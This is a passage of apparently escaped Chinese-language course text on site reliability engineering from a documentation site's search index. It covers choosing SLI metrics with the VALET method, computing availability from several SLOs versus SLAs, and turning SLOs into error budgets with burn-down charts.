<p>\u9519\u8bef\u7387\u6709\u591a\u5c11\uff1f\u8fd9\u91cc\u9664\u4e865xx\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u628a4xx\u5217\u8fdb\u6765\uff0c\u56e0\u4e3a\u524d\u9762\u6211\u4eec\u7684\u670d\u52a1\u53ef\u7528\u6027\u4e0d\u9519\uff0c\u4f46\u662f\u4ece\u4e1a\u52a1\u548c\u4f53\u9a8c\u89d2\u5ea6\uff0c4xx\u592a\u591a\uff0c\u7528\u6237\u4e5f\u662f\u4e0d\u80fd\u63a5\u53d7\u7684\u3002</p> <p>\u6216\u8005\u53ef\u4ee5\u589e\u52a0\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684\u72b6\u6001\u7801\uff0c\u770b\u54ea\u4e9b\u72b6\u6001\u662f\u5bf9\u4e1a\u52a1\u6709\u635f\u7684\uff0c\u6bd4\u5982\u67d0\u4e9b\u70ed\u95e8\u5546\u54c1\u603b\u662f\u7f3a\u8d27\uff0c\u7528\u6237\u767b\u5f55\u9a8c\u8bc1\u7801\u603b\u662f\u8f93\u5165\u9519\u8bef\uff0c\u8fd9\u4e9b\u867d\u4e0d\u662f\u7cfb\u7edf\u9519\u8bef\uff0c\u4f46\u4ece\u4e1a\u52a1\u89d2\u5ea6\u6765\u770b\uff0c\u5bf9\u7528\u6237\u7684\u4f53\u9a8c\u5f71\u54cd\u8fd8\u662f\u6bd4\u8f83\u5927\u7684\u3002</p> <p>Tickets - \u4eba\u5de5\u4ecb\u5165</p> <p>\u662f\u5426\u9700\u8981\u4eba\u5de5\u4ecb\u5165\uff1f\u5982\u679c\u4e00\u9879\u5de5\u4f5c\u6216\u4efb\u52a1\u9700\u8981\u4eba\u5de5\u4ecb\u5165\uff0c\u90a3\u8bf4\u660e\u4e00\u5b9a\u662f\u4f4e\u6548\u6216\u6709\u95ee\u9898\u7684\u3002\u4e3e\u4e00\u4e2a\u6211\u4eec\u5e38\u89c1\u7684\u573a\u666f\uff0c\u6570\u636e\u4efb\u52a1\u8dd1\u5931\u8d25\u4e86\uff0c\u4f46\u662f\u65e0\u6cd5\u81ea\u52a8\u6062\u590d\uff0c\u8fd9\u65f6\u5c31\u8981\u4eba\u5de5\u4ecb\u5165\u6062\u590d\uff1b\u6216\u8005\u8d85\u65f6\u4e86\uff0c\u4e5f\u9700\u8981\u4eba\u5de5\u4ecb\u5165\uff0c\u6765\u4e2d\u65ad\u4efb\u52a1\u3001\u91cd\u542f\u62c9\u8d77\u6765\u8dd1\u7b49\u7b49\u3002</p> <p>Tickets\u7684SLO\u53ef\u4ee5\u60f3\u8c61\u6210\u5b83\u7684\u4e2d\u6587\u542b\u4e49\uff1a\u95e8\u7968\u3002\u4e00\u4e2a\u5468\u671f\u5185\uff0c\u95e8\u7968\u6570\u91cf\u662f\u56fa\u5b9a\u7684\uff0c\u6bd4\u5982\u6bcf\u670820\u5f20\uff0c\u6bcf\u6b21\u4eba\u5de5\u4ecb\u5165\uff0c\u5c31\u6d88\u8017\u4e00\u5f20\uff0c\u5982\u679c\u6d88\u8017\u5b8c\u4e86\uff0c\u8fd8\u9700\u8981\u4eba\u5de5\u4ecb\u5165\uff0c\u90a3\u5c31\u662f\u4e0d\u8fbe\u6807\u4e86\u3002</p> <p>\u8fd9\u91cc\u6211\u7ed9\u51fa\u4e00\u4e2aGoogle\u63d0\u4f9b\u7684\uff0c\u9488\u5bf9\u7c7b\u4f3c\u4e8e\u6211\u4eectrade_cart\u7684\u4e00\u4e2a\u5e94\u7528\u670d\u52a1\uff0c\u57fa\u4e8eVALET\u8bbe\u8ba1\u51fa\u6765\u7684SLO\u7684Dashboard\u6837\u4f8b\uff0c\u7ed3\u5408\u4e0a\u9762\u6211\u4eec\u4ecb\u7ecd\u7684\u90e8\u5206\uff0c\u5c31\u4e00\u76ee\u4e86\u7136\u4e86\u3002</p> <p></p> <p>\u597d\uff0cVALET\u6211\u4eec\u5c31\u8bb2\u5b8c\u4e86\uff0c\u600e\u4e48\u9009SLI\u6307\u6807\uff0c\u4f60\u662f\u4e0d\u662f\u4e00\u4e0b\u5b50\u5c31\u6e05\u695a\u4e86\u3002\u53ef\u4ee5\u8bf4\uff0c\u8fd9\u662f\u4e00\u4e2a\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u590d\u7528\u7684\u5de5\u5177\u3002\u4e0a\u9762Google\u7684\u8fd9\u5f20SLO\u6837\u4f8b\u56fe\uff0c\u5efa\u8bae\u4f60\u591a\u770b\u51e0\u904d\uff0c\u770b\u5230\u65f6\u5019\uff0c\u5bf9\u6bd4\u601d\u8003\u4e0b\u81ea\u5df1\u7cfb\u7edf\u7684\u60c5\u51b5\u3002</p>"},{"location":"ops/50-sre-mogu-03/#slo","title":"\u5982\u4f55\u901a\u8fc7SLO\u8ba1\u7b97\u53ef\u7528\u6027","text":"<p>\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u5df2\u7ecf\u80fd\u591f\u6839\u636e\u81ea\u5df1\u60f3\u8981\u4fdd\u969c\u7a33\u5b9a\u6027\u7684\u4e3b\u4f53\uff0c\u6765\u9009\u62e9\u5408\u9002\u7684SLI\u6307\u6807\u4e86\uff0c\u4e5f\u77e5\u9053SLO\u5c31\u662f\u5bf9\u5e94SLI\u8981\u5b9e\u73b0\u7684\u76ee\u6807\uff0c\u6bd4\u5982\u201c\u51e0\u4e2a9\u201d\u3002</p> <p>\u4f46\u662f\uff0c\u6211\u4eec\u524d\u9762\u8bb2\u5230\u4e86\u7cfb\u7edf\u53ef\u7528\u6027\uff1a</p> <p><code>Availability = Successful request / Total request</code></p> <p>\u7136\u540e\u53c8\u6df1\u5165\u5230\u4e86\u63d0\u70bc\u5177\u4f53\u7684SLI\uff0c\u4ee5\u53ca\u8bbe\u5b9a\u5bf9\u5e94\u7684SLO\uff0c\u90a3\u8fd9\u4e24\u8005\u4e4b\u95f4\u662f\u4ec0\u4e48\u5173\u7cfb\u5462\uff1f\u4e5f\u5c31\u662f\u901a\u8fc7SLO\u5e94\u8be5\u600e\u4e48\u53bb\u8ba1\u7b97\u6211\u4eec\u7684\u7cfb\u7edf\u53ef\u7528\u6027\u7684\u5462\uff1f\u8fd9\u5c31\u6d89\u53ca\u5230\u7cfb\u7edf\u6574\u4f53\u53ef\u7528\u6027\u7684\u4e24\u79cd\u8ba1\u7b97\u65b9\u5f0f\u3002</p> <p>\u7b2c\u4e00\u79cd\uff0c\u76f4\u63a5\u6839\u636e\u6210\u529f\u7684\u5b9a\u4e49\u6765\u8ba1\u7b97\u3002</p> <p>\u4e5f\u5c31\u662f\u6211\u4eec\u524d\u9762\u5b9a\u4e49\u4e00\u4e2a\u8bf7\u6c42\u7684\u8fd4\u56de\u72b6\u6001\u7801\u5fc5\u987b\u662f\u975e5xx\u624d\u7b97\u6210\u529f\uff0c\u540c\u65f6\u65f6\u5ef6\u8fd8\u8981\u4f4e\u4e8e80ms\uff0c\u540c\u65f6\u6ee1\u8db3\u8fd9\u4e24\u4e2a\u6761\u4ef6\uff0c\u6211\u4eec\u624d\u7b97\u662f\u6210\u529f\u7684\uff0c\u4e5f\u5c31\u662f\u7eb3\u5165\u4e0a\u8ff0\u516c\u5f0f\u4e2dSuccessful request\u7684\u7edf\u8ba1\u4e2d\uff0c\u7528\u516c\u5f0f\u6765\u8868\u793a\uff1a</p> <p><code>Successful = \uff08\u72b6\u6001\u7801\u975e5xx\uff09  \uff08\u65f6\u5ef6 = 80ms\uff09</code></p> <p>\u5982\u679c\u8fd8\u6709\u5176\u5b83\u6761\u4ef6\uff0c\u76f4\u63a5\u5728\u540e\u9762\u589e\u52a0\u505a\u7efc\u5408\u5224\u5b9a\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u79cd\u8ba1\u7b97\u65b9\u5f0f\u5b58\u5728\u7684\u95ee\u9898\u5c31\u662f\uff0c\u5bf9\u5355\u6b21\u8bf7\u6c42\u7684\u6210\u529f\u4e0e\u5426\u7684\u5224\u5b9a\u592a\u8fc7\u6b7b\u677f\uff0c\u5bb9\u6613\u9519\u6740\u8bef\u5224\u3002\u6bd4\u5982\u6211\u4eec\u524d\u9762\u8bb2\u5bf9\u4e8e\u65f6\u5ef6\uff0c\u6211\u4eec\u4e00\u822c\u4f1a\u8bbe\u5b9a\u7f6e\u4fe1\u533a\u95f4\uff0c\u6bd4\u598290%\u65f6\u5ef6\u5c0f\u4e8e\u7b49\u4e8e200ms\u8fd9\u6837\u7684\u573a\u666f\uff0c\u7528\u8fd9\u79cd\u65b9\u5f0f\u5c31\u5f88\u96be\u4f53\u73b0\u51fa\u6765\u3002\u800c\u4e14\uff0c\u5bf9\u4e8e\u72b6\u6001\u7801\u6210\u529f\u7387\u548c\u65f6\u5ef6\u6210\u529f\u7387\u7684\u5bb9\u5fcd\u5ea6\uff0c\u901a\u5e38\u4e5f\u662f\u4e5f\u4e0d\u4e00\u6837\u7684\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5c31\u4e0d\u591f\u51c6\u786e\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u5c31\u4f1a\u91c7\u53d6\u7b2c\u4e8c\u79cd\u65b9\u5f0f\u3002</p> <p>\u7b2c\u4e8c\u79cd\u65b9\u5f0f\uff0cSLO\u65b9\u5f0f\u8ba1\u7b97\u3002</p> <p>\u6211\u4eec\u524d\u9762\u8bb2\u65f6\u5ef6\u65f6\u8bb2\u8fc7\u4ee5\u4e0b\u51e0\u4e2aSLO\uff0c\u8fd9\u65f6\u6211\u4eec\u8bbe\u5b9a\u7a33\u5b9a\u6027\u7684\u65f6\u5019\uff0c\u5c31\u9700\u8981\u628a\u516c\u5f0f\u8ba1\u7b97\u65b9\u5f0f\u7075\u6d3b\u8c03\u6574\u5b9a\u4e49\u4e00\u4e0b\u4e86\u3002</p> <ul> <li>SLO1\uff1a99.95% \u72b6\u6001\u7801\u6210\u529f\u7387</li> <li>SLO2\uff1a90% Latency = 80ms</li> <li>SLO3\uff1a99% Latency = 200ms</li> </ul> <p>\u76f4\u63a5\u7528\u516c\u5f0f\u8868\u793a\uff1a<code>Availability = SLO1 &amp; SLO2 &amp; SLO3</code></p> <p>\u53ea\u6709\u5f53\u8fd9\u4e2a\u4e09\u4e2aSLO\u540c\u65f6\u8fbe\u6807\u65f6\uff0c\u6574\u4e2a\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u624d\u7b97\u8fbe\u6807\uff0c\u6709\u4e00\u4e2a\u4e0d\u8fbe\u6807\u5c31\u4e0d\u7b97\u8fbe\u6807\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5f88\u597d\u5730\u5c06SLO\u8bbe\u5b9a\u7684\u5408\u7406\u6027\u4e0e\u6700\u7ec8\u53ef\u7528\u6027\u7ed3\u5408\u4e86\u8d77\u6765\u3002\u6240\u4ee5\uff0c\u901a\u5e38\u5728SRE\u5b9e\u8df5\u4e2d\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u91c7\u7528\u8fd9\u79cd\u8bbe\u5b9a\u65b9\u5f0f\u3002</p> <p>\u5982\u679c\u662f\u8fd9\u6837\uff0c\u7b2c\u4e00\u79cd\u65b9\u5f0f\u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u7528\u9014\u4e86\u5462\uff1f\u5f53\u7136\u4e0d\u662f\u3002\u7b2c\u4e00\u79cd\u8ba1\u7b97\u65b9\u5f0f\u4e5f\u4f1a\u6709\u5b83\u7279\u6709\u7684\u5e94\u7528\u573a\u666f\uff0c\u5b83\u901a\u5e38\u4f1a\u88ab\u5229\u7528\u5728\u7b2c\u4e09\u65b9\u63d0\u4f9b\u7684\u670d\u52a1\u627f\u8bfa\u4e2d\uff0c\u4e5f\u5c31\u662fSLA\uff08 Service Level Agreement\uff09\u3002\u56e0\u4e3a\u5bf9\u4e8e\u7b2c\u4e09\u65b9\u63d0\u4f9b\u5546\u6765\u8bf4\uff0c\u6bd4\u5982\u4e91\u5382\u5546\uff0c\u5b83\u4eec\u8981\u9762\u5bf9\u7684\u5ba2\u6237\u7fa4\u4f53\u662f\u975e\u5e38\u5927\u7684\uff0c\u6240\u4ee5\u5f88\u96be\u8ddf\u6bcf\u4e00\u5bb6\u5ba2\u6237\u90fd\u53bb\u5236\u5b9a\u50cfSLO\u8fd9\u4e48\u7ec6\u7c92\u5ea6\u7a33\u5b9a\u6027\u76ee\u6807\uff0c\u800c\u4e14\u6bcf\u5bb6\u5ba2\u6237\u5bf9\u7a33\u5b9a\u6027\u7684\u8981\u6c42\u548c\u611f\u77e5\u4e5f\u4e0d\u540c\uff0c\u5c31\u6ca1\u6cd5\u7edf\u4e00\u3002</p> <p>\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u53cd\u800c\u662f\u7b2c\u4e00\u79cd\u8ba1\u7b97\u65b9\u5f0f\u662f\u76f8\u5bf9\u7b80\u5355\u76f4\u63a5\u7684\uff0c\u4f46\u662f\u8fd9\u6837\u4e5f\u51b3\u5b9a\u4e86SLA\u7684\u627f\u8bfa\u76f8\u6bd4SLO\u80af\u5b9a\u4e5f\u76f8\u5bf9\u6bd4\u8f83\u5bbd\u677e\uff0c\u56e0\u4e3aSLA\u662f\u5546\u4e1a\u670d\u52a1\u627f\u8bfa\uff0c\u5982\u679c\u8fbe\u4e0d\u6210\u662f\u8981\u8fdb\u884c\u8d54\u507f\u7684\u3002\u5173\u4e8eSLA\uff0c\u6700\u76f4\u63a5\u7684\u53c2\u8003\u8d44\u6599\uff0c\u5c31\u662f\u5404\u4e2a\u516c\u6709\u4e91\u5382\u5546\u5728\u5b98\u7f51\u516c\u5f00\u7684\u4fe1\u606f\u8d44\u6599\uff0c\u4f60\u53ef\u4ee5\u627e\u5230\u8fd9\u4e9b\u8d44\u6599\uff0c\u4f5c\u4e3a\u81ea\u5df1\u7684\u4e00\u4e2a\u8865\u5145\u5b66\u4e60\u3002</p>"},{"location":"ops/50-sre-mogu-03/#_1","title":"\u603b\u7ed3","text":"<p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u600e\u4e48\u9009\u62e9SLI\u6307\u6807\u3001\u5982\u4f55\u5236\u5b9aSLO\u76ee\u6807\uff0c\u6211\u4eec\u5c31\u4ecb\u7ecd\u5b8c\u4e86\u3002\u4f60\u9700\u8981\u638c\u63e1\u4e0b\u9762\u4e09\u4e2a\u91cd\u70b9\u3002</p> <ul> <li>\u5bf9\u7cfb\u7edf\u76f8\u5173\u6307\u6807\u8981\u5206\u5c42\uff0c\u8bc6\u522b\u51fa\u6211\u4eec\u8981\u4fdd\u969c\u7a33\u5b9a\u6027\u7684\u4e3b\u4f53\uff08\u7cfb\u7edf\u3001\u4e1a\u52a1\u6216\u5e94\u7528\uff09\u662f\u4ec0\u4e48\uff0c\u7136\u540e\u57fa\u4e8e\u8fd9\u4e2a\u4e3b\u4f53\u6765\u9009\u62e9\u5408\u9002\u7684SLI\u6307\u6807\u3002</li> <li>\u4e0d\u662f\u6240\u6709\u7684\u6307\u6807\u90fd\u662f\u9002\u5408\u505aSLI\u6307\u6807\uff0c\u5b83\u4e00\u5b9a\u8981\u80fd\u591f\u76f4\u63a5\u4f53\u73b0\u548c\u53cd\u6620\u4e3b\u4f53\u7684\u7a33\u5b9a\u6027\u72b6\u6001\u3002\u53ef\u4ee5\u4f18\u5148\u9009\u62e9\u7528\u6237\u6216\u4f7f\u7528\u8005\u80fd\u611f\u53d7\u5230\u7684\u4f53\u9a8c\u7c7b\u6307\u6807\uff0c\u6bd4\u5982\u65f6\u5ef6\u3001\u53ef\u7528\u6027\u3001\u9519\u8bef\u7387\u7b49\u3002</li> <li>\u638c\u63e1VALET\u65b9\u6cd5\uff0c\u5feb\u901f\u9009\u62e9SLI\u6307\u6807\u3002</li> </ul>"},{"location":"ops/50-sre-mogu-04/","title":"04 | \u9519\u8bef\u9884\u7b97\uff1a\u8fbe\u6210\u7a33\u5b9a\u6027\u76ee\u6807\u7684\u5171\u8bc6\u673a\u5236","text":"<p>\u4e0a\u4e00\u8bb2\u662f\u6211\u4eec\u5f15\u5165SRE\u7684\u5173\u952e\uff0c\u6211\u4eec\u638c\u63e1\u4e86\u9009\u62e9SLI\u6307\u6807\u548c\u8bbe\u5b9aSLO\u76ee\u6807\u7684\u65b9\u6cd5\u3002\u4f60\u53ef\u4ee5\u5148\u56de\u987e\u4e00\u4e0b\u5185\u5bb9\uff0c\u770b\u770b\u662f\u4e0d\u662f\u80fd\u56de\u7b54\u8fd9\u4e09\u4e2a\u95ee\u9898\uff1a\u9009\u62e9SLI\u7684\u4e24\u5927\u539f\u5219\u662f\u4ec0\u4e48\uff1fVALET\u6cd5\u5219\u662f\u4ec0\u4e48\uff1f\u600e\u4e48\u6765\u8ba1\u7b97SLO\uff1f\u5982\u679c\u7b54\u6848\u90fd\u5f88\u6e05\u6670\uff0c\u90a3\u4e48\u606d\u559c\u4f60\uff0c\u4f60\u653b\u514b\u4e86SRE\u7684\u4e00\u4e2a\u5173\u952e\u77e5\u8bc6\u70b9\uff1b\u5982\u679c\u6709\u70b9\u6a21\u7cca\uff0c\u90a3\u5c31\u56de\u53bb\u590d\u4e60\u4e00\u4e0b\uff0c\u54b1\u4e0d\u6c42\u5feb\uff0c\u4f46\u6c42\u624e\u5b9e\u3002</p> <p>\u4eca\u5929\uff0c\u6211\u4eec\u5c31\u987a\u7740SLO\u8fd9\u6761\u7ebf\uff0c\u7ee7\u7eed\u6df1\u5165\uff0c\u4e00\u8d77\u6765\u770b\u6709\u4e86SLO\u4e4b\u540e\uff0c\u56f4\u7ed5\u7740\u5b83\u6211\u4eec\u53ef\u4ee5\u505a\u54ea\u4e9b\u4e8b\u60c5\uff0c\u6216\u8005\u8bf4\u6211\u4eec\u5177\u4f53\u5e94\u8be5\u600e\u4e48\u6765\u5e94\u7528SLO\u5462\uff1f\u8fd8\u6709\uff0cSLO\u8bbe\u5b9a\u540e\uff0c\u662f\u5408\u7406\u8fd8\u662f\u4e0d\u5408\u7406\uff0c\u6211\u4eec\u5e94\u8be5\u7528\u4ec0\u4e48\u6837\u7684\u65b9\u6cd5\u6765\u8bc4\u4f30\u5462\uff1f\u5982\u679c\u8bbe\u5b9a\u5f97\u4e0d\u5408\u7406\uff0c\u6211\u4eec\u53c8\u5e94\u8be5\u600e\u4e48\u6765\u8c03\u6574\u5462\uff1f</p> <p>\u5e26\u7740\u8fd9\u4e9b\u95ee\u9898\uff0c\u5f00\u59cb\u6211\u4eec\u4eca\u5929\u7684\u5b66\u4e60\u3002</p>"},{"location":"ops/50-sre-mogu-04/#sloerror-budget","title":"\u843d\u5730SLO\uff0c\u5148\u8f6c\u5316\u4e3aError Budget","text":"<p>SLO\u662f\u76ee\u6807\uff0c\u5b9a\u76ee\u6807\u603b\u662f\u4e00\u4ef6\u6fc0\u52a8\u4eba\u5fc3\u7684\u4e8b\uff0c\u4f46\u662f\u76ee\u6807\u5b9a\u4e86\u4e4b\u540e\uff0c\u8fd9\u4e2a\u76ee\u6807\u600e\u4e48\u80fd\u6307\u5bfc\u6211\u4eec\u7684\u5177\u4f53\u5de5\u4f5c\u5462\uff0c\u6709\u65f6\u5019\u5c31\u6ca1\u90a3\u4e48\u4e00\u76ee\u4e86\u7136\u4e86\u3002</p> <p>\u8fd9\u4e48\u8bf4\u6709\u70b9\u62bd\u8c61\uff0c\u6211\u4e3e\u4e2a\u751f\u6d3b\u4e2d\u7684\u4f8b\u5b50\u3002\u4f60\u901a\u8fc7\u597d\u51e0\u8f6e\u8003\u8bd5\uff0c\u62ff\u5230\u4e86\u9a7e\u7167\uff0c\u73b0\u5728\u4f60\u53ef\u4ee5\u5f00\u8f66\u4e0a\u8def\u4e86\u3002\u4ea4\u7ba1\u5c40\u7684\u76ee\u6807\u5c31\u662f\u4f60\u8981\u9075\u5b88\u4ea4\u89c4\uff0c\u5b89\u5168\u9a7e\u9a76\u3002\u8fd9\u4e2a\u76ee\u6807\u548b\u5b9e\u73b0\u5462\uff1f\u6211\u4eec\u90fd\u77e5\u9053\u4e86\uff0c\u5c31\u662f\u9a7e\u7167\u8bb0\u5206\u5236\u3002\u4f60\u7684\u9a7e\u7167\u57281\u5e74\u7684\u8fd9\u4e2a\u5468\u671f\u91cc\uff0c\u603b\u5171\u670912\u5206\uff0c\u6263\u5b8c\u4e86\u9a7e\u7167\u5931\u6548\uff0c\u8fd9\u6837\u4f60\u5c31\u4f1a\u5173\u6ce8\u81ea\u5df1\u8fd8\u6709\u51e0\u5206\uff0c\u7279\u522b\u6ce8\u610f\u4ea4\u89c4\u3002\u7528\u8fd9\u4e2a\u65b9\u5f0f\uff0c\u5c31\u628a\u4f60\u8981\u8d8b\u8fd1100%\u9075\u5b88\u4ea4\u89c4\u7684\u76ee\u6807\u8f6c\u53d8\u4e3a\u4f60\u4e00\u5e74\u53ea\u670912\u5206\u53ef\u6263\uff0c\u4e00\u4e2a\u5927\u76ee\u6807\u5c31\u6709\u4e86\u5f88\u5177\u4f53\u7684\u843d\u5730\u5f62\u5f0f\u3002</p> <p>\u90a3\u540c\u6837\uff0cSLO\u76ee\u6807\u5b9a\u597d\u4e86\uff0c\u5f88\u5177\u4f53\uff0c\u4f46\u5b9e\u65bd\u8d77\u6765\u4e0d\u76f4\u89c2\uff0c\u90a3\u6211\u4eec\u662f\u4e0d\u662f\u4e5f\u53ef\u4ee5\u53cd\u8fc7\u6765\u770b\uff0c\u5236\u5b9a\u51fa\u4e00\u4e2a\u5141\u8bb8\u72af\u9519\u7684\u6b21\u6570\u6807\u51c6\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u76d1\u63a7\u8fd9\u4e9b\u9519\u8bef\u5c31\u597d\u4e86\u3002</p> <p>\u6ca1\u9519\uff0cSRE\u8fd8\u771f\u662f\u8fd9\u4e48\u505a\u7684\uff0c\u8fd9\u4e2a\u6982\u5ff5\u53eb\u505aError Budget\uff0c\u7ffb\u8bd1\u8fc7\u6765\u5c31\u662f\u9519\u8bef\u9884\u7b97\u3002</p> <p>\u9519\u8bef\u9884\u7b97\u5176\u5b9e\u548c\u9a7e\u7167\u8bb0\u5206\u5236\u662f\u4e00\u6837\u7684\uff0c\u6700\u5927\u7684\u4f5c\u7528\u5c31\u662f\u201c\u63d0\u793a\u4f60\u8fd8\u6709\u591a\u5c11\u6b21\u72af\u9519\u7684\u673a\u4f1a\u201d\uff0c\u5e76\u4e14\uff0c\u9519\u8bef\u9884\u7b97\u7684\u8b66\u793a\u6548\u679c\u6bd4\u770b\u6210\u529f\u7387\u8fd9\u79cd\u7edf\u8ba1\u6570\u636e\u66f4\u76f4\u89c2\uff0c\u611f\u5b98\u51b2\u51fb\u529b\u66f4\u5f3a\u3002</p> <p>\u90a3\u5728SLO\u4e2d\uff0c\u9519\u8bef\u9884\u7b97\u662f\u600e\u4e48\u5f97\u51fa\u7684\u5462\uff1f\u5176\u5b9e\u8ba1\u7b97\u65b9\u5f0f\u4e00\u70b9\u90fd\u4e0d\u590d\u6742\uff0c\u7b80\u5355\u8bb2\u5c31\u662f\u901a\u8fc7SLO\u53cd\u5411\u63a8\u5bfc\u51fa\u6765\u7684\u3002\u4e0b\u9762\u6211\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4f60\u9a6c\u4e0a\u5c31\u53ef\u4ee5\u7406\u89e3\u4e86\u3002</p> <p>\u6211\u4eec\u8fd8\u662f\u4ee5trade_cart\u8d2d\u7269\u8f66\u8fd9\u4e2a\u5e94\u7528\u4e3a\u4f8b\uff0cSLO\u76ee\u6807\u5c31\u662f\u6211\u4eec\u4e0a\u8282\u8bfe\u5b9a\u8fc7\u7684\u3002\u5047\u8bbe\u57284\u5468\u7684\u65f6\u95f4\uff0c\u8fd9\u4e2a\u5e94\u7528\u6240\u6709\u7684\u8bf7\u6c42\u6b21\u6570\u662f4,653,680\uff0c\u6309\u7167\u7ed9\u51fa\u7684SLO\u53cd\u5411\u63a8\u5bfc\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u5bb9\u8bb8\u7684\u9519\u8bef\u6b21\u6570\uff0c\u8fd9\u5c31\u662f\u9519\u8bef\u9884\u7b97\u3002</p> <p></p> <p>\u4f60\u770b\uff0c\u9519\u8bef\u9884\u7b97\u7684\u8ba1\u7b97\u5f88\u7b80\u5355\uff0c\u8d77\u5230\u7684\u8b66\u793a\u6548\u679c\u53c8\u66f4\u5f3a\u70c8\uff0c\u6240\u4ee5**\u5728SLO\u843d\u5730\u5b9e\u8df5\u65f6\uff0c\u6211\u4eec\u901a\u5e38\u5c31\u628aSLO\u8f6c\u5316\u4e3a\u9519\u8bef\u9884\u7b97\uff0c\u4ee5\u6b64\u6765\u63a8\u8fdb\u7a33\u5b9a\u6027\u76ee\u6807\u8fbe\u6210**\u3002</p> <p>\u90a3\u5728\u5b9e\u9645\u573a\u666f\u4e0b\uff0c\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u5e94\u7528\u9519\u8bef\u9884\u7b97\u5462\uff1f\u4e0b\u9762\u6211\u7ed9\u4f60\u4ecb\u7ecd\u5e38\u89c1\u76844\u79cd\u5e94\u7528\u65b9\u5f0f\u3002</p>"},{"location":"ops/50-sre-mogu-04/#error-budget","title":"\u5982\u4f55\u5e94\u7528Error Budget\uff1f","text":""},{"location":"ops/50-sre-mogu-04/#1","title":"1.\u7a33\u5b9a\u6027\u71c3\u5c3d\u56fe","text":"<p>\u7b2c\u4e00\u79cd\u662f\u7a33\u5b9a\u6027\u71c3\u5c3d\u56fe\u3002</p> <p>\u5f53\u6211\u4eec\u5236\u5b9a\u597d\u9519\u8bef\u9884\u7b97\u540e\uff0c\u5c31\u4ee3\u8868\u4e86\u8981\u4e25\u683c\u9075\u5b88\u5b83\u3002\u5982\u679c\u5728\u4e00\u4e2a\u5468\u671f\u5185\uff0c\u6bd4\u59824\u4e2a\u81ea\u7136\u5468\uff0c\u9519\u8bef\u9884\u7b97\u88ab\u6d88\u8017\u5b8c\u4e86\uff0c\u5c3d\u7ba1\u6574\u4e2a\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u51fa\u73b0\u8fbe\u5230\u6545\u969c\u6807\u51c6\u7684\u95ee\u9898\uff0c\u8fd9\u4e2a\u5468\u671f\u7684\u7a33\u5b9a\u6027\u8981\u6c42\u5176\u5b9e\u4e5f\u662f\u4e0d\u8fbe\u6807\u7684\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u9700\u8981\u628a\u9519\u8bef\u9884\u7b97\u5c3d\u53ef\u80fd\u76f4\u89c2\u5730\u8868\u73b0\u51fa\u6765\uff0c\u968f\u65f6\u53ef\u4ee5\u770b\u5230\u5b83\u7684\u6d88\u8017\u60c5\u51b5\u3002\u5f53\u4f60\u548c\u56e2\u961f\u6210\u5458\u80fd\u591f\u65f6\u523b\u770b\u5230\u8fd8\u6709\u591a\u5c11\u72af\u9519\u7684\u673a\u4f1a\u65f6\uff0c\u5bf9\u751f\u4ea7\u7cfb\u7edf\u7684\u656c\u754f\u5fc3\u7406\u4e5f\u4f1a\u5927\u5927\u589e\u5f3a\u3002\u800c\u4e14\u5f53\u9519\u8bef\u9884\u7b97\u6d88\u8017\u5230\u4e00\u5b9a\u6bd4\u4f8b\uff0c\u598280%\u621690%\u65f6\uff0c\u5c31\u8981\u5f00\u59cb\u9884\u8b66\uff0c\u63a7\u5236\u5404\u79cd\u53d8\u66f4\uff0c\u6216\u8005\u6295\u5165\u7cbe\u529b\u53bb\u89e3\u51b3\u5f71\u54cd\u7a33\u5b9a\u6027\u7684\u95ee\u9898\u3002</p> <p>\u90a3\u600e\u4e48\u5236\u4f5c\u7a33\u5b9a\u6027\u71c3\u5c3d\u56fe\u5462\uff1f</p> <p>\u8fd9\u91cc\uff0c\u53ef\u4ee5\u53c2\u8003Google\u7ed9\u51fa\u7684\u4e00\u4e2a\u9519\u8bef\u9884\u7b97\u7684\u71c3\u5c3d\u56fe\uff0c\u8fd9\u4e2a\u4ece\u6280\u672f\u4e0a\uff0c\u901a\u8fc7\u4f60\u65e5\u5e38\u4f7f\u7528\u7684\u76d1\u63a7\u5e73\u53f0\u914d\u7f6e\u4e00\u4e2aMetric\u5c31\u53ef\u4ee5\u5b9e\u73b0\uff0c\u5e76\u4e0d\u590d\u6742\u3002</p> <p></p> <p>\u5728\u5e94\u7528\u9519\u8bef\u9884\u7b97\u7684\u65f6\u5019\uff0c\u4f60\u8981\u8003\u8651\u8bbe\u5b9a\u4e00\u4e2a\u5408\u7406\u7684\u5468\u671f\uff0c\u6bd4\u59821\u5929\u30011\u5468\u62161\u4e2a\u6708\u3002</p> <p>1\u5929\u62161\u5468\uff0c\u5468\u671f\u76f8\u5bf9\u8f83\u77ed\uff0c\u6211\u4eec\u901a\u5e38\u7684\u5efa\u8bae\u662f4\u4e2a\u81ea\u7136\u5468\uff0c\u8fd9\u4e2a\u5468\u671f\u8bbe\u5b9a\u66f4\u5408\u7406\uff0c\u8fd9\u4e5f\u662f\u8c37\u6b4c\u7ed9\u51fa\u7684\u5efa\u8bae\u3002\u4e3a\u4ec0\u4e48\u90094\u4e2a\u81ea\u7136\u5468\uff0c\u800c\u4e0d\u662f1\u4e2a\u81ea\u7136\u6708\u5462\uff1f\u4e3b\u8981\u662f\u56e0\u4e3a\u81ea\u7136\u6708\u901a\u5e38\u4f1a\u5bfc\u81f4\u8de8\u5468\u7684\u60c5\u51b5\u51fa\u73b0\uff0c\u76f8\u6bd4\u4e8e4\u4e2a\u81ea\u7136\u5468\uff0c\u5728\u7edf\u8ba1\u4e0a\u5c31\u8981\u8003\u8651\u989d\u5916\u7684\u8fb9\u754c\u95ee\u9898\u3002</p> 